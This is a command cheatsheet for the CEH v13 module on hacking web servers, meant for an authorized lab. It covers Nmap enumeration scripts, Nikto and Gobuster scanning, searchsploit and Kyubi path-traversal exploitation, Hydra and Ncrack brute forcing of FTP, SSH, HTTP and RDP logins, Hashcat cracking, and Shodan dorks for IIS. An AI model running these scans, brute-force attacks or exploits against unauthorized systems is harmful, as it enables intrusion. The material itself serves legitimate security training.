# Cheatsheet 01 — Command Quick Reference

Every real command from **CEH v13 Module 13 (Hacking Web Servers)**, grouped by task, ready to copy-paste into an authorized lab. Replace target IPs/domains (`10.10.1.x`, `certifiedhacker.com`, etc.) with your own lab targets.

## Recon & Whois

```bash
whois certifiedhacker.com

curl https://target.com/robots.txt
wget https://target.com/robots.txt -O robots.txt
```

## Banner Grabbing / Footprinting

```bash
# Netcat
nc -vv www.moviescope.com 80
GET / HTTP/1.0
# (press Enter twice)

# Telnet
telnet www.moviescope.com 80
GET / HTTP/1.0
# (press Enter twice)

# AI-assisted compound scan (Nmap + WhatWeb + Nikto)
nmap -sV 10.10.1.22 && whatweb 10.10.1.22 && nikto -h 10.10.1.22

# AI-assisted Netcat HEAD request (heredoc)
nc -v 10.10.1.22 80 <<EOF
HEAD / HTTP/1.1
Host: 10.10.1.22

EOF
```

## Nmap — Full NSE Script Arsenal for Web Servers

```bash
# Discover virtual domains
nmap --script hostmap-bfk <host>

# Detect vulnerable TRACE method
nmap --script http-trace -p80 localhost
nmap -p80 --script http-trace <host>

# Harvest email accounts
nmap --script http-google-email <host>

# Enumerate users via mod_userdir
nmap -p80 --script http-userdir-enum localhost
nmap -p80 --script http-userdir-enum <target>
nmap -p80 --script http-userdir-enum --script-args userdir.users=<Wordlist>.txt <target>

# Bypass detection with a custom user agent
nmap -p80 --script http-brute --script-args http.useragent="<User_Agent>" <target>

# WAF / IPS detection and fingerprinting
nmap -p80 --script http-waf-detect \
  --script-args="http-waf-detect.uri=/testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges" \
  www.modsecurity.org
nmap --script=http-waf-fingerprint -p80,443 <host>

# Enumerate common web applications
nmap --script http-enum -p80 <host>
nmap -sV --script http-enum <target IP address>

# Obtain robots.txt via NSE
nmap -p80 --script http-robots.txt <host>

# OS + version detection combo
nmap -sV -O -p <target IP address>

# Front-page login script check
nmap <target IP address> -p 80 --script=http-frontpage-login

# Default password enumeration
nmap --script http-passwd --script-args http-passwd.root=/ <target IP address>

# Full authenticated-style enum example
nmap -sV --script=http-enum www.goodshopping.com
```

## Vulnerability Scanning

```bash
# Nikto2 — general web server vulnerability scan
nikto -h 10.10.1.19
nikto -h 10.10.1.22

# NginxPwner — Nginx misconfig scanner
nano /tmp/pathlist            # paste candidate URL paths, save with CTRL+X
python3 nginxpwner.py <target_URL> /tmp/pathlist
```

## Directory / Content Discovery

```bash
# Dirhunt — directory listing discovery
dirhunt http://www.moviescope.com

# Gobuster — AI-assisted directory brute force
gobuster dir -u https://certifiedhacker.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Gobuster — common extra flags
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,txt,bak -t 50
```

## Website Mirroring

```bash
# HTTrack
httrack "http://www.certifiedhacker.com" -O "./mirror" "+*.certifiedhacker.com/*" -v

# Wget mirror mode
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://target.com
```

## Exploitation

```bash
# AI-assisted OS/service ID + searchsploit workflow
sudo apt-get update && sudo apt-get install nmap -y \
  && nmap -sV -O 10.10.1.19 -oX nmap_scan.xml \
  && sudo apt-get install exploitdb -y \
  && searchsploit-nmap nmap_scan.xml

# Manual searchsploit usage
searchsploit apache 2.4.49
searchsploit --nmap nmap_scan.xml
searchsploit -m <EDB-ID>

# Kyubi — Nginx alias path-traversal exploitation
kyubi -v <target_URL>
```

## Brute Force / Password Cracking

```bash
# Hydra — FTP
hydra -L /usr/share/wordlists/ftp-usernames.txt -P /usr/share/wordlists/ftp-passwords.txt ftp://10.10.1.11
hydra -l admin -p Summer2024! ftp://10.10.1.11        # single known credential pair

# Hydra — SSH
hydra -L /usr/share/wordlists/ssh-usernames.txt -P /usr/share/wordlists/ssh-passwords.txt ssh://<target-IP>

# Hydra — HTTP basic auth
hydra -L users.txt -P passwords.txt <target-IP> http-get /admin/

# Hydra — HTTP POST login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-IP> \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# Hydra — RDP
hydra -l administrator -P passwords.txt rdp://<target-IP>

# Ncrack — SSH
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt <target-IP>

# Hashcat
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt   # straight
hashcat -m 1400 -a 3 sha256_hashes.txt ?a?a?a?a?a?a?a?a                 # mask/brute-force
hashcat -m 0 -a 6 md5_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d   # hybrid
```

## Shodan Dorks (IIS-focused)

```
http.title:"IIS"
ssl:"Company Inc." http.title:"IIS"
http.title:"IIS Windows Server" country:"US"
http.title:"IIS7" port:80
http.title:"IIS7" net:"<IP_address>/24"
http.title:"IIS7"
http.title:"IIS Windows Server"
http.title:"Internet Information Services"
```

## Default Credential / Content Resources (no command — reference sites)

| Purpose | URL |
|---|---|
| Default web app credentials | https://cirt.net/passwords |
| Default device passwords | https://www.fortypoundhead.com |
| Default device passwords | https://www.defaultpassword.com |
| Default device passwords | https://default-password.info |
| Default router passwords | https://www.routerpasswords.com |

---

*See also: [Cheatsheet 02 — Attack ↔ Defense Methodology Map](02-attack-defense-methodology-map.md) for how these commands map onto the overall attack methodology and their corresponding defenses.*
